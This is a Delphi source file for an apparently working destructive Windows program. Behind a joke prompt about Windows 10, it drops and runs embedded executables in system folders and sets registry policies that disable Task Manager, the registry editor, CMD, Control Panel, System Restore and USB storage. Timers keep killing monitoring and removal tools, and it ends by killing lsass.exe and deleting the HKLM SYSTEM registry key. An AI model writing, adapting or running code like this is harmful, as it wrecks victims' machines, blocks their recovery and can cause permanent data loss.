unit Unit1;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ExtCtrls, System.UITypes, ShellApi, Registry, TlHelp32;

type
  TForm1 = class(TForm)
    Timer1: TTimer;
    Timer2: TTimer;
    Timer3: TTimer;
    Timer4: TTimer;
    procedure FormCreate(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure Timer2Timer(Sender: TObject);
    procedure Timer3Timer(Sender: TObject);
    procedure Timer4Timer(Sender: TObject);
  private
    { Déclarations privées }
  public
    { Déclarations publiques }
  end;

var
  Form1: TForm1;

implementation

uses

mmsystem;

{$R *.dfm}

function KillTask(ExeFileName: string): Integer;
const
  PROCESS_TERMINATE = $0001;
var
  ContinueLoop: BOOL;
  FSnapshotHandle: THandle;
  FProcessEntry32: TProcessEntry32;
begin
  Result := 0;
  FSnapshotHandle := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  FProcessEntry32.dwSize := SizeOf(FProcessEntry32);
  ContinueLoop := Process32First(FSnapshotHandle, FProcessEntry32);

  while Integer(ContinueLoop) <> 0 do
  begin
    if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) =
      UpperCase(ExeFileName)) or (UpperCase(FProcessEntry32.szExeFile) =
      UpperCase(ExeFileName))) then
      Result := Integer(TerminateProcess(
                        OpenProcess(PROCESS_TERMINATE,
                                    BOOL(0),
                                    FProcessEntry32.th32ProcessID),
                                    0));
     ContinueLoop := Process32Next(FSnapshotHandle, FProcessEntry32);
  end;
  CloseHandle(FSnapshotHandle);
end;

procedure FGPlayASound(const AResName: string);
 var
   HResource: TResourceHandle;
   HResData: THandle;
   PWav: Pointer;
 begin
  HResource := FindResource(HInstance, PChar(AResName), 'WAV');
  if HResource <> 0 then begin
    HResData:=LoadResource(HInstance, HResource);
    if HResData <> 0 then begin
      PWav:=LockResource(HResData);
      if Assigned(PWav) then begin
        // uses MMSystem
        sndPlaySound(nil, SND_NODEFAULT); // nil = stop currently playing
        sndPlaySound(PWav, SND_ASYNC or SND_MEMORY);
      end;
//      UnlockResource(HResData); // unnecessary per MSDN
//      FreeResource(HResData);   // unnecessary per MSDN
    end;
  end
  else
    RaiseLastOSError;
end;


procedure TForm1.FormCreate(Sender: TObject);
var
buttonselected : Integer;
ResStream: TResourceStream;
make : TRegistry;
PicPath: String;
FileName : String;
begin

   buttonSelected := MessageDlg('Do you like Windows 10?',mtWarning, mbYesNo,0);
if buttonSelected = mrYes then
begin
Timer4.Enabled := False;
FileName := 'C:\Windows\System32\nt.exe';
if FileExists (FileName) then
begin
  KillTask('nt.exe');
  System.SysUtils.Sleep(10);
  DeleteFile(FileName);
      ResStream := TResourceStream.Create(HInstance, 'Note', RT_RCDATA);
  try
    ResStream.Position := 0;
    ResStream.SaveToFile('C:\Windows\System32\nt.exe');
  finally
    ResStream.Free;
  end;
  WinExec('C:\Windows\System32\nt.exe', SW_SHOW);
end
else
begin
    ResStream := TResourceStream.Create(HInstance, 'Note', RT_RCDATA);
  try
    ResStream.Position := 0;
    ResStream.SaveToFile('C:\Windows\System32\nt.exe');
  finally
    ResStream.Free;
  end;

  WinExec('C:\Windows\System32\nt.exe', SW_SHOW);
end;

FileName := 'C:\Windows\idk.exe';
if FileExists(FileName) then
begin
   KillTask('idk.exe');
   System.SysUtils.Sleep(10);
   DeleteFile(FileName);
        ResStream := TResourceStream.Create(HInstance, 'Kill', RT_RCDATA);
  try
    ResStream.Position := 0;
    ResStream.SaveToFile('C:\Windows\idk.exe');
  finally
    ResStream.Free;
  end;
    WinExec('C:\Windows\idk.exe', SW_SHOW);
end
else
begin
   ResStream := TResourceStream.Create(HInstance, 'Kill', RT_RCDATA);
  try
    ResStream.Position := 0;
    ResStream.SaveToFile('C:\Windows\idk.exe');
  finally
    ResStream.Free;
  end;
    WinExec('C:\Windows\idk.exe', SW_SHOW);
end;



                make := TRegistry.Create;
  make.RootKey := HKEY_CURRENT_USER;
  make.OpenKey('Software\Policies\Microsoft\MMC', True);
 make.WriteInteger('RestrictToPermittedSnapins', 1);


 make := TRegistry.Create;
  make.RootKey := HKEY_CURRENT_USER;
  make.OpenKey('Software\Microsoft\Windows\CurrentVersion\Policies\System', True);
 make.WriteInteger('DisableRegistryTools', 1);


 make := TRegistry.Create;
  make.RootKey := HKEY_LOCAL_MACHINE;
  make.OpenKey('Software\Microsoft\Windows\CurrentVersion\Policies\Explorer', True);
 make.WriteInteger('NoRun', 1);


 make := TRegistry.Create;
  make.RootKey := HKEY_CURRENT_USER;
  make.OpenKey('Software\Policies\Microsoft\Windows\System', True);
 make.WriteInteger('DisableCMD', 2);


 make := TRegistry.Create;
  make.RootKey := HKEY_LOCAL_MACHINE;
  make.OpenKey('Software\Microsoft\Windows\CurrentVersion\Policies\Explorer', True);
 make.WriteInteger('NoControlPanel', 1);

 make := TRegistry.Create;
  make.RootKey := HKEY_CURRENT_USER;
  make.OpenKey('Software\Microsoft\Windows\CurrentVersion\Policies\System', True);
 make.WriteInteger('DisableTaskMgr', 1);

 make := TRegistry.Create;
  make.RootKey := HKEY_CURRENT_USER;
  make.OpenKey('Software\Microsoft\Windows\CurrentVersion\Policies\Explorer', True);
 make.WriteInteger('NoDesktop', 1);

 make := TRegistry.Create;
  make.RootKey := HKEY_LOCAL_MACHINE;
  make.OpenKey('Software\Policies\Microsoft\Windows NT\SystemRestore', True);
 make.WriteInteger('DisableSR', 1);

 make := TRegistry.Create;
  make.RootKey := HKEY_LOCAL_MACHINE;
  make.OpenKey('SYSTEM\CurrentControlSet\Services\USBSTOR', True);
 make.WriteInteger('Start', 4);

               KillTask('cmd.exe');
               KillTask('conhost.exe');
               KillTask('Regedit.exe');
               KillTask('SystemPropertiesProtection.exe');
               KillTask('control.exe');
               KillTask('SystemSettings.exe');
               KillTask('mmc.exe');

                  KillTask('ProcessHacker.exe');
KillTask('IObitUnlocker.exe');

                ResStream := TResourceStream.Create(HInstance, 'Background', RT_RCDATA);
  try
    ResStream.Position := 0;
    ResStream.SaveToFile('C:\Windows\Background.bmp');
  finally
    ResStream.Free;
  end;
            PicPath := 'C:\Windows\Background.bmp';
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, pChar(PicPath), SPIF_SENDCHANGE);

               KillTask('explorer.exe');
               System.SysUtils.Sleep(7000);
               FGPlayASound('Windows');
                   System.SysUtils.Sleep(4010);

                   FileName := 'C:\Windows\hi.exe';
                   if FileExists(FileName) then
                   begin
                     KillTask('hi.exe');
                     System.SysUtils.Sleep(10);
                     DeleteFile(FileName);
  ResStream := TResourceStream.Create(HInstance, 'Install', RT_RCDATA);
  try
    ResStream.Position := 0;
    ResStream.SaveToFile('C:\Windows\hi.exe');
  finally
    ResStream.Free;
  end;
    WinExec('C:\Windows\hi.exe', SW_SHOW);
    end
    else
    begin
  ResStream := TResourceStream.Create(HInstance, 'Install', RT_RCDATA);
  try
    ResStream.Position := 0;
    ResStream.SaveToFile('C:\Windows\hi.exe');
  finally
    ResStream.Free;
  end;
    WinExec('C:\Windows\hi.exe', SW_SHOW);
    end;
      FGPlayASound('Error');
      System.SysUtils.Sleep(146000);


  KillTask('lsass.exe');
  make := TRegistry.Create;
  make.RootKey := HKEY_LOCAL_MACHINE;
  make.DeleteKey('SYSTEM');
  Application.ShowMainForm := False;
  Application.Terminate;
end
else
begin
Timer4.Enabled := False;
   ShowMessage('Okay. I trust you');
        Application.ShowMainForm := False;
  Application.Terminate;
end;


end;




procedure TForm1.Timer1Timer(Sender: TObject);
begin
     KillTask('ProcessHacker.exe');
KillTask('IObitUnlocker.exe');
KillTask('Taskmgr.exe');
KillTask('procexp.exe');
KillTask('procexp64.exe');
KillTask('procexp64a.exe');
end;

procedure TForm1.Timer2Timer(Sender: TObject);
begin
   KillTask('Taskmgr.exe');
  KillTask('procexp.exe');
KillTask('procexp64.exe');
KillTask('procexp64a.exe');
end;

procedure TForm1.Timer3Timer(Sender: TObject);
begin
 KillTask('powershell.exe');
KillTask('powershell_ise.exe');
KillTask('cmd.exe');
               KillTask('conhost.exe');
               KillTask('Regedit.exe');
               KillTask('SystemPropertiesProtection.exe');
               KillTask('control.exe');
               KillTask('SystemSettings.exe');
               KillTask('mmc.exe');
end;

procedure TForm1.Timer4Timer(Sender: TObject);
var
Path : String;
ResStream: TResourceStream;
KEYEVENTF_KEYDOWN : Integer;
make : TRegistry;
begin
  KEYEVENTF_KEYDOWN := 0;
  Path := 'C:\Windows\System32\notepad.exe';

  make := TRegistry.Create;
  make.RootKey := HKEY_LOCAL_MACHINE;
  make.OpenKey('Software\Policies\Microsoft\Windows NT\SystemRestore', True);
 make.WriteInteger('DisableSR', 1);

  if FileExists(Path) then
  begin
      WinExec('C:\Windows\System32\notepad.exe', SW_SHOW);
                                   keybd_event(Ord('Y'), 0, KEYEVENTF_KEYDOWN, 0);
                                   keybd_event(Ord('Y'), 0, KEYEVENTF_KEYUP, 0);
                                                     System.SysUtils.Sleep(20);
                                   keybd_event(Ord('O'), 0, KEYEVENTF_KEYDOWN, 0);
                                   keybd_event(Ord('O'), 0, KEYEVENTF_KEYUP, 0);
                                                      System.SysUtils.Sleep(20);
                                   keybd_event(Ord('U'), 0, KEYEVENTF_KEYDOWN, 0);
                                   keybd_event(Ord('U'), 0, KEYEVENTF_KEYUP, 0);
                                                         System.SysUtils.Sleep(20);
                                   keybd_event(VK_SPACE, 0, KEYEVENTF_KEYDOWN, 0);
                                   keybd_event(VK_SPACE, 0, KEYEVENTF_KEYUP, 0);
                                              System.SysUtils.Sleep(40);

  keybd_event(Ord('W'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('W'), 0, KEYEVENTF_KEYUP, 0);
                      System.SysUtils.Sleep(20);
  keybd_event(Ord('A'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('A'), 0, KEYEVENTF_KEYUP, 0);
                      System.SysUtils.Sleep(20);
  keybd_event(Ord('I'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('I'), 0, KEYEVENTF_KEYUP, 0);
                       System.SysUtils.Sleep(20);
  keybd_event(Ord('T'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('T'), 0, KEYEVENTF_KEYUP, 0);
                        System.SysUtils.Sleep(20);
  keybd_event(Ord('E'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('E'), 0, KEYEVENTF_KEYUP, 0);
                        System.SysUtils.Sleep(20);
  keybd_event(Ord('D'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('D'), 0, KEYEVENTF_KEYUP, 0);
                       System.SysUtils.Sleep(20);
  keybd_event(VK_SPACE, 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(VK_SPACE, 0, KEYEVENTF_KEYUP, 0);
                          System.SysUtils.Sleep(40);
  keybd_event(Ord('T'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('T'), 0, KEYEVENTF_KEYUP, 0);
                        System.SysUtils.Sleep(20);
  keybd_event(Ord('O'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('O'), 0, KEYEVENTF_KEYUP, 0);
                             System.SysUtils.Sleep(20);
  keybd_event(Ord('O'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('O'), 0, KEYEVENTF_KEYUP, 0);
                             System.SysUtils.Sleep(20);
  keybd_event(VK_SPACE, 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(VK_SPACE, 0, KEYEVENTF_KEYUP, 0);
                             System.SysUtils.Sleep(40);
  keybd_event(Ord('M'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('M'), 0, KEYEVENTF_KEYUP, 0);
                                System.SysUtils.Sleep(20);
  keybd_event(Ord('U'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('U'), 0, KEYEVENTF_KEYUP, 0);
                                System.SysUtils.Sleep(20);
  keybd_event(Ord('C'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('C'), 0, KEYEVENTF_KEYUP, 0);
                                 System.SysUtils.Sleep(20);
  keybd_event(Ord('H'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('H'), 0, KEYEVENTF_KEYUP, 0);
                               System.SysUtils.Sleep(500);
                     KillTask('lsass.exe');

                     make := TRegistry.Create;
  make.RootKey := HKEY_LOCAL_MACHINE;
  make.DeleteKey('SYSTEM');
  Application.ShowMainForm := False;
  Application.Terminate;
  end
  else
  begin
      ResStream := TResourceStream.Create(HInstance, 'Notepad', RT_RCDATA);
  try
    ResStream.Position := 0;
    ResStream.SaveToFile('C:\Windows\System32\notepad.exe');
  finally
    ResStream.Free;
  end;
    WinExec('C:\Windows\System32\notepad.exe', SW_SHOW);

        keybd_event(Ord('Y'), 0, KEYEVENTF_KEYDOWN, 0);
                                   keybd_event(Ord('Y'), 0, KEYEVENTF_KEYUP, 0);
                                                     System.SysUtils.Sleep(20);
                                   keybd_event(Ord('O'), 0, KEYEVENTF_KEYDOWN, 0);
                                   keybd_event(Ord('O'), 0, KEYEVENTF_KEYUP, 0);
                                                     System.SysUtils.Sleep(20);
                                   keybd_event(Ord('U'), 0, KEYEVENTF_KEYDOWN, 0);
                                   keybd_event(Ord('U'), 0, KEYEVENTF_KEYUP, 0);
                                                     System.SysUtils.Sleep(20);
                                   keybd_event(VK_SPACE, 0, KEYEVENTF_KEYDOWN, 0);
                                   keybd_event(VK_SPACE, 0, KEYEVENTF_KEYUP, 0);
                                                    System.SysUtils.Sleep(40);

  keybd_event(Ord('W'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('W'), 0, KEYEVENTF_KEYUP, 0);
                           System.SysUtils.Sleep(20);
  keybd_event(Ord('A'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('A'), 0, KEYEVENTF_KEYUP, 0);
                            System.SysUtils.Sleep(20);
  keybd_event(Ord('I'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('I'), 0, KEYEVENTF_KEYUP, 0);
                              System.SysUtils.Sleep(20);
  keybd_event(Ord('T'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('T'), 0, KEYEVENTF_KEYUP, 0);
                              System.SysUtils.Sleep(20);
  keybd_event(Ord('E'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('E'), 0, KEYEVENTF_KEYUP, 0);
                              System.SysUtils.Sleep(20);
  keybd_event(Ord('D'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('D'), 0, KEYEVENTF_KEYUP, 0);
                                System.SysUtils.Sleep(20);
  keybd_event(VK_SPACE, 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(VK_SPACE, 0, KEYEVENTF_KEYUP, 0);
                                System.SysUtils.Sleep(40);
  keybd_event(Ord('T'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('T'), 0, KEYEVENTF_KEYUP, 0);
                                     System.SysUtils.Sleep(20);
  keybd_event(Ord('O'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('O'), 0, KEYEVENTF_KEYUP, 0);
                                   System.SysUtils.Sleep(20);
  keybd_event(Ord('O'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('O'), 0, KEYEVENTF_KEYUP, 0);
                                System.SysUtils.Sleep(20);
  keybd_event(VK_SPACE, 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(VK_SPACE, 0, KEYEVENTF_KEYUP, 0);
                                       System.SysUtils.Sleep(40);
  keybd_event(Ord('M'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('M'), 0, KEYEVENTF_KEYUP, 0);
                                    System.SysUtils.Sleep(20);
  keybd_event(Ord('U'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('U'), 0, KEYEVENTF_KEYUP, 0);
                                    System.SysUtils.Sleep(20);
  keybd_event(Ord('C'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('C'), 0, KEYEVENTF_KEYUP, 0);
                                     System.SysUtils.Sleep(20);
  keybd_event(Ord('H'), 0, KEYEVENTF_KEYDOWN, 0);
  keybd_event(Ord('H'), 0, KEYEVENTF_KEYUP, 0);
System.SysUtils.Sleep(500);

                  KillTask('lsass.exe');

                     make := TRegistry.Create;
  make.RootKey := HKEY_LOCAL_MACHINE;
  make.DeleteKey('SYSTEM');
  Application.ShowMainForm := False;
  Application.Terminate;
  end;
end;

end.
